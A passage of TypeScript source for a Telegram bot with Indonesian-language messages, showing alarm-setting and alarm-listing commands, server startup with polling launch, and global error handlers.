      let ms = 0;
      let label = "";

      if (args.includes(':')) {
        const [h, m] = args.split(':').map(Number);
        if (isNaN(h) || isNaN(m) || h < 0 || h > 23 || m < 0 || m > 59) {
          return ctx.reply("❌ Format jam salah. Gunakan HH:MM (0-23:0-59)");
        }
        const now = new Date();
        const target = new Date();
        target.setHours(h, m, 0, 0);
        if (target.getTime() <= now.getTime()) {
           target.setDate(target.getDate() + 1); // Besok
        }
        ms = target.getTime() - now.getTime();
        label = `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}`;
      } else {
        const mins = parseInt(args);
        if (isNaN(mins) || mins <= 0) return ctx.reply("❌ Masukkan jumlah menit yang valid.");
        ms = mins * 60 * 1000;
        label = `${mins} menit lagi`;
      }

      if (ms > 24 * 60 * 60 * 1000 * 7) return ctx.reply("❌ Alarm maksimal 7 hari.");

      const alarmId = setTimeout(() => {
        ctx.reply(`⏰ <b>ALARM BUNYI!</b>\n━━━━━━━━━━━━━\nWaktu: ${label}`, { parse_mode: 'HTML' });
        const userAlarms = activeAlarms.get(ctx.from.id) || [];
        activeAlarms.set(ctx.from.id, userAlarms.filter(a => a.id !== alarmId));
      }, ms);

      const userAlarms = activeAlarms.get(ctx.from.id) || [];
      userAlarms.push({ id: alarmId, time: label, targetTime: Date.now() + ms });
      activeAlarms.set(ctx.from.id, userAlarms);

      ctx.reply(`✅ <b>Alarm diset!</b>\nSekitar: ${label}`, { parse_mode: 'HTML' });
    });

    bot.command('listalarm', (ctx) => {
      const userAlarms = activeAlarms.get(ctx.from.id) || [];
      if (userAlarms.length === 0) return ctx.reply("📭 Tidak ada alarm aktif.");

      let msg = `⏰ <b>ALARM AKTIF ANDA</b>\n━━━━━━━━━━━━━\n`;
      userAlarms.forEach((a, i) => {
        const remaining = Math.round((a.targetTime - Date.now()) / 60000);
        msg += `${i+1}. <b>${a.time}</b> (~${remaining} mnt lagi)\n`;
      });
      ctx.reply(msg, { parse_mode: 'HTML' });
    });

    process.once('SIGINT', () => bot && bot.stop('SIGINT'));
    process.once('SIGTERM', () => bot && bot.stop('SIGTERM'));
  } else {
    console.log("TELEGRAM_BOT_TOKEN not provided, skipping Telegram bot setup.");
  }

  const server = app.listen(PORT, "0.0.0.0", () => {
    console.log(`[${new Date().toISOString()}] SERVER ONLINE ON PORT ${PORT}`);
    console.log(`[${new Date().toISOString()}] HOST: ${appHost}`);

    // LAUNCH BOT ONLY AFTER SERVER IS LISTENING
    if (bot && token) {
      // Use Polling for better stability on Railway
      console.log(`[BOT] STARTING POLLING MODE...`);
      bot.launch({ dropPendingUpdates: true }).then(() => {
        console.log(`[BOT] ✅ BOT ONLINE (POLLING)`);
      }).catch(err => {
        if (err.code === 409) {
           console.warn(`[BOT] WARNING: Bot already running elsewhere. Links will still work but polling is limited.`);
        } else {
           console.error(`[BOT] ❌ LAUNCH ERROR:`, err.message);
        }
      });
    }
  });

  server.on('error', (err: any) => {
    console.error(`[${new Date().toISOString()}] CRITICAL SERVER ERROR:`, err);
    process.exit(1);
  });

  // Global uncaught exceptions handler
  process.on('uncaughtException', (err) => {
    console.error('[UNCAUGHT EXCEPTION]', err);
  });
  process.on('unhandledRejection', (reason, promise) => {
    console.error('[UNHANDLED REJECTION] at:', promise, 'reason:', reason);
  });
}

startServer().catch(err => {
  console.error("FATAL ERROR DURING STARTUP:", err);
  process.exit(1);
});
